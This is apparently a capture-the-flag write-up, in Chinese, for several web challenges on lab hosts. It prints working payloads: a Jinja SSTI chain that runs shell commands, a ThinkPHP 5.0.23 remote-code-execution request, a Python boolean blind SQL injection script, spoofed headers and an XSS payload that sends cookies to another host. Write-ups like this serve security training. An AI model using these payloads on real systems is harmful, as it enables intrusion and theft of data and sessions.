Web

## fake google

> 知识点：SSTI

> 题解

1. 根据源代码注释提示，SSTI模板注入
2. 注入

```
{% for c in [].__class__.__base__.__subclasses__() %}
{%if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}
{%endif%}
{% endfor %}
```

## old-hack

> 知识点：ThinkPHP5.0.23 远程RCE

> 题解

```
POST http://244a0b0a-7187-4c12-b732-c4c75557924b.node3.buuoj.cn/?s=captcha

{
    "_method": "__construct",
    "filter[]": "system",
    "server[REQUEST_METHOD]": "cat /flag"
}
```

> flag{5c1565e5-6062-4416-b15a-75d3bc704bc6}

## 假猪套天下第一

> 题解

```
GET /L0g1n.php
Cookie: PHPSESSID=29l41t2qh0buaagirh7tlqrsu6; time=253400544000
Client-IP: 127.0.0.1
User-Agent: Commodore 64
from: root@gem-love.com
via: y1ng.vip
```

> flag{d68b92d3-635a-492d-9411-8c603ba1561c}

## duangShell

> 题解

1. /.index.php.swp下载源码
2. vim -r index.php.swp 查看源码
3. 反弹shell

## Schrödinger

> 题解

1. 设置cookied为空，check，拿到passwd
2. 去b站搜索

> BJD{Quantum_Mechanics_really_Ez}

## 简单注入

> 题解

```
import requests


def sql_injection_boolean(url: str, injection_key:str, injection_sql: str, vailstr: str, data: dict = {}, *args, **kwargs) -> str:
    """SQL injection -- Boolean
    """

    strlist = []

    for i in range(1, 50):
        high = 127
        low = 32
        mid = (low + high) // 2

        while high > low:

            data[injection_key] = injection_sql.format(i, mid)

            print(data)

            response = requests.post(url, data=data, *args, **kwargs)
            if vailstr in response.text:
                low = mid + 1
            else:
                high = mid

            mid = (low + high) // 2

        strlist.append(chr(int(mid)))

        print("".join(strlist))
    
    return "".join(strlist)


if __name__ == "__main__":
    url = 'http://30884624-9e73-4421-b7bb-35764d4f60c8.node3.buuoj.cn/index.php'
    injection_sql = "or if(ascii(substr(password,{},1))>{},1,0)#"
    data = {
        "username": "admin\\",
        "password": None,
    }
    sql_injection_boolean(url, "password", injection_sql, "BJD need", data)
```

> flag{5984b4fc-8dde-46ea-92a6-9513fba11f23}

## XSS之光

> 题解

1. GitHack.py 获取源码
2. 构造Payload

```
<?php
$a = serialize(new Exception("<script>window.location.href='57b195da-6920-48d5-8398-9d7ea9255150.node3.buuoj.cn'+document.cookie</script>"));
echo urlencode($a);
?>
# 运行，拿到编码之后的
```

> flag{4e506368-1f7b-4efb-85b9-50285b19d8b2}